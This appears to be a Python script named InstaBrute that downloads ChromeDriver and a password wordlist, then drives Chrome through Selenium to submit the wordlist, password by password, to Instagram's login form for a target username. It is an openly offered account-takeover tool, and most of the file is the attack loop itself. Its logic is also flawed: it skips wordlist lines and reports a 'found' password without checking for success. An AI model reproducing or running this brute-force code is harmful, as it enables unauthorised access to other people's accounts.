from selenium.webdriver.chrome.options import Options
from colorama import Fore, Back, Style
from termcolor import colored, cprint
from selenium import webdriver
from zipfile import ZipFile
import colorama
import optparse
import time
import wget
import os


colorama.init()



def InstallBrowser():
    try:
        print(Fore.GREEN)
        url = 'https://chromedriver.storage.googleapis.com/2.35/chromedriver_win32.zip'
        urlWordlist ="https://raw.githubusercontent.com/OgulcanKacarr/InstaBrute/main/wordlist.txt"
        filename = wget.download(url)
        wordlistDownload = wget.download(urlWordlist)
        print("\n\n")
        nowPath = os.getcwd()
        filePath = nowPath + "\\chromedriver_win32.zip"
        fileEnvironPath = os.getcwd() + "\\chromedriver_win32.exe"
        zf = ZipFile('chromedriver_win32.zip', 'r')
        zf.extractall(nowPath)
        zf.close()
        os.environ["path2"] = fileEnvironPath
        os.remove("chromedriver_win32.zip")
    except KeyboardInterrupt:
        print(Fore.RED)
        print("\nBye bye")


def fileConts():   
    haveOrnotFile = os.path.exists("chromedriver.exe")
    haveOrnotWordlist = os.path.exists("wordlist.txt")
    if haveOrnotFile == False and haveOrnotWordlist == False:
        width = "170"
        height = "130"
        os.system("mode con cols="+width+"lines="+height)
        print(Fore.BLUE)
        print("""

                                                                                                                                                       
                                                                                                      .                                                   
                                                   ...'',,.                                         .''''.....                                            
                                              .'''''''''....                     .'''.              .......''.....                                        
                                         ..''.','...''....     '.     ...  .''. .:ddl.               .................                                    
                                       ..','',,''...''''...''',,.    ,od:..:dd:..;dd;  .:cccc:,.      ..'......'''......                                  
                                    ...'','..''.....'...  ..',,''::. ;ddc. ;dd:..'od;.,odc''::c;..,:;'...........,'..'.....                               
                                 ...'''..''..''.........';'':;::';o, .coo:;cdl.  'od,.'lo:.......,:lcclc'........,'..'.........                           
                              ...'...............,cooolc,..lc.:d;.cl...;c;,'',....;l,...,c:::;..lxo::lod;..,;....'...............                         
                              ....''...........;lol,.;odo' 'c:,,,,;c,........ ..................,::::loc'.cddl:,'.....'...........                        
                             .......'.........:dl'.   ;dd;  .',''.,c,....   .;:;'.,:.  .....'....  ..;;..cddl;,col,....''......'....                      
                          ...........'.'.... 'ddo:....ldo;     ''',..       ;olcooc;.     ....          'dd:. .,ldo....','.....'...'..                    
                        .................'.   ,ooollol:'..                 .co:;ll;,.      .            .''. .cddl.  ..........'..'''....                 
                     .............''.   ...    ....';.                      ,llolcc:'                       .cdc'.   ..   .........'.......               
                     .. ..   ......                                           ...'::.                        ..             ................              
                     ......  .                                              .;:cldc,.                                                ......               
                 .........                                                 .lxoccl,                                                   .''......           
                .......                                                     .,;:coo:.                                                   .',...'.          
              .......                                                            .;;.                                                     ........        
            ..'...                                                          ..     .'.                                                       ....'.       
           .....                                                           .;.      ;;'.                                                       ...''.     
          .....                                                            .;,     .;...                                                        ....'.    
         ....                                                               .,;;;;,,.                                                             .....   
        ...                                                                   ...,;'                                                                ....  
                                                                            ..,;cll:.                                                                     
                                                                           .cdocll,                                                                       
                                                                           .,clcloc,.                                                                     
                                                                              ...;cc.                                                                     
                                                                           .,'.  .,:'                                                                     
                                                                           .;ol;;cl;.                       Oğulcan KAÇAR                                             
                                                                            .;oddl;'.                       github.com/OgulcanKacarr                                              
                                                                           .:lloolc:'.                                                                    
                         .....'...'.......''..'.. .''.                       ......                      ..'....'...'.......'.........                    
                                                                           .........                                                                      
                                                                           ..........                                                                     
                                                                           ..........                                                                     
                                                                           .''....'..                                                                     

        """)
        print(Fore.GREEN)
        print("\n\n[!] please wait, files are uploading..\n")
        print("============================================")
        time.sleep(3)
        try:
            InstallBrowser()
            print(Fore.GREEN)
            print("Download complete")
            print(Fore.RED)
            print("\n[+] use to python3 InstaBrute.py -t <username>")
            exit()
        except KeyboardInterrupt:
            print(Fore.RED)
            print("\nCancel")
            exit()
    else:
        width = "75"
        height = "29"
        os.system("mode con cols="+width+"lines="+height)

    

def Attack(userAttack):
    haveOrnot = os.path.exists("chromedriver.exe")
    if haveOrnot == False:
        fileConts()
    else:

        try:
            width = "75"
            height = "29"
            os.system("mode con cols="+width+"lines="+height)
            browser = webdriver.Chrome(service_args=['2>/dev/null'])
            browser.set_window_position(50, 50)
            browser.set_window_size(500,500)
            browser.get("https://www.instagram.com/")
            time.sleep(3)
            wordlist = open("wordlist.txt","r",encoding="utf-8")
            for Attack in wordlist:
                username = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[1]/div/label/input')
                password = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[2]/div/label/input')
                login = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[3]')
                login.click()
                os.system("cls")
                line = wordlist.readline()
                username.send_keys(userAttack)
                password.send_keys(line)

                print(Fore.GREEN,"""

                                

                     [+] trying to password ---> """,line

                    

                )
                print(Fore.RED,"exit >> ctrl+c")
                login.click()
                time.sleep(2)
                browser.refresh()
                time.sleep(2)
            else:
                print(Fore.RED)
                print("Password found (or your wordlist is finished) ---> ",line)
                time.sleep(5)
                wordlist.close()
        except KeyboardInterrupt:
            print(Fore.RED)
            print("\nCancel \ngood bye!")
            time.sleep(3)
            exit()
        except ImportError:
            print(Fore.RED)
            print("\nCancel \ngood bye!")
            time.sleep(3)
            exit()



parseObject = optparse.OptionParser()
print(Fore.GREEN)
parseObject.add_option("-t","--target",dest="userName",help="Instagram username = Ör:// ogulcan_kcr")


(targetUsername,arguments) = parseObject.parse_args()



try:
    Attack(targetUsername.userName)
except AttributeError:
    print("""



                                                                                                            
                                .....''..               ..          ........                            
                             ...''..'...   .    .. .'. .lc.   .      ...........                        
                          ..','''.........','. ,d;.;d;.'ll.'::;:;. .........''....                      
                       ...'''..''..',...'';;;:''ll,:l, .lc.;l;','.,cc:;.....''........                  
                     ............;ccclc.,:,;,;;..,'.....',..',,,.,llcol',:;'............                
                     ..........'cl,..:d,..'.';,.....';,','..........',',oo;;:;...'.......               
                  ..............lo:,,::.   ....    .:lllc'    .        ,:..;ol..............            
                ..........  ..  .'';,.             .;c:::'                ;l,. ..  ...........          
                 ... ...                            .';;:.                ..         ..  ......         
             .....                                 .cooo;.                                .......       
           .....                                    .',;:'                                   .....      
         ....                                       .    ..                                    .....    
        ....                                       .'    ',.                                     ....   
       ...                                          .''.'..                                        ...  
       .                                             .,;:.                                           .  
                                                   .:lll:.                                              
                                                   .';;:c'                                              
                                                   .'. .;,                                              
                                                   .;ccc:'                                              
                                                   .,clc;'                                              
                  ................ ..               .....               .. ................             
                                                   .......                                              
                                                   .'.....                                              
                                                   .,...,.                                       



        """)
    exit()












             
          
